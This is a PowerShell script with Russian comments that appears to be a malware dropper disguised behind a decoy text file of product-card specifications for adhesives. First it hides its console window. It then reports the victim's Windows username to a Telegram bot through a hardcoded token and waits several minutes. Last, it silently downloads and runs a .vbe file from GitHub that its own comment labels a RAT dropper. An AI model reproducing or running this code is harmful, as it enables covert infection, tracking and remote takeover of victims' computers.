# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "product_cards.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Язык: русский.
Изображения: главное фото 2000×2000 px (белый фон); доп. — процесс/до‑после/масштаб; подпись и альт‑текст к каждому фото.
Формат сдачи: тексты UTF‑8 (txt/таблица); макеты — DOCX/PSD/Figma по согласованию.
Папки с фото: Akfix 65гр+200мл; COSMO FEN 20г; POXIPOL 14мл.

POXIPOL 14 мл — Карточка 1 (Основная)
- Заголовок: Металлическая холодная сварка POXIPOL 14 мл — эпоксидный двухкомпонентный клей‑мастика, серый.
- Буллеты: 5 пунктов (назначение; основные материалы; консистенция; морозостойкость).
- Описание: 1 абзац (назначение и ключевое преимущество).
- Изображения и метаданные: главное фото + 1 доп.; SKU POX-014-STD; теги.

POXIPOL 14 мл — Карточка 2 (Техническая)
- Заголовок: POXIPOL 14 мл — технический двухкомпонентный эпоксидный клей.
- Техтаблица: основа; объём/вес; количество компонентов; условия отверждения.
- Инструкция: подготовка поверхности; пропорции; время работы/полное отверждение.
- Документы: ссылка на SDS; рекомендации по утилизации.

POXIPOL 14 мл — Карточка 3 (Кейсы)
- Заголовок: POXIPOL 14 мл — ремонт металла и реставрация декоративных элементов.
- Буллеты кейсов: 3–4 преимущества в контексте задач.
- Фото‑кейсы: до/после, крупный план.
- Логистика: рекомендации по упаковке, вес/габариты.

COSMO FEN 20 г — Карточка 1 (Основная)
- Заголовок: Цианоакрилатный клей COSMO FEN 20 г — прозрачный флакон.
- Буллеты: 5 пунктов (однокомпонентный; объём; скорость схватывания; макс. t).
- Описание: 1 абзац (назначение и преимущество).
- Изображения и метаданные: главное фото; SKU COS-FEN-020; теги.

COSMO FEN 20 г — Карточка 2 (Инструкции)
- Заголовок: COSMO FEN 20 г — инструкция и ограничения.
- Техтаблица: основа; объём/вес; условия отверждения; макс. t.
- Инструкция: подготовка; дозирование; удаление клея с кожи.
- Предупреждения: несовместимые материалы; хранение.

COSMO FEN 20 г — Карточка 3 (Мобильная)
- Заголовок: COSMO FEN 20 г — моментальный клей, 20 г.
- Буллеты: 3–4 ключевых преимущества.
- Описание: 1 предложение — зачем покупать.
- Изображение: главное фото; подпись и альт‑текст.

Akfix 705 65 г + 200 мл — Карточка 1 (Основная комплектная)
- Заголовок: Набор Akfix 705 65 г + 200 мл — экспресс клей с активатором.
- Буллеты: состав набора; склеиваемые материалы; консистенция; морозостойкость.
- Описание: 1 абзац — назначение и преимущество.
- Изображения и метаданные: главное фото комплекта; SKU AKF-705-SET.

Akfix 705 65 г + 200 мл — Карточка 2 (Инструкция)
- Заголовок: Akfix 705 — нанесение геля и активация распылителем.
- Пошагово: подготовка; нанесение; распыление активатора; время фиксации.
- Техтаблица: основа; объём/компоненты; консистенция; склеиваемые материалы.
- Документы: SDS и меры предосторожности для аэрозолей.

Akfix 705 65 г + 200 мл — Карточка 3 (B2B)
- Заголовок: Akfix 705 — набор для профессионального использования.
- Буллеты B2B: расход/м²; срок годности; варианты упаковки; условия хранения.
- Описание: 1 абзац с коммерческим предложением.
- Логистика: вес брутто, габариты, требования к транспортировке.

Обязательное для всех карточек:
- Текстовые лимиты: буллет ≤ 80 символов; описание 40–80 слов.
- Безопасность: меры пред
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit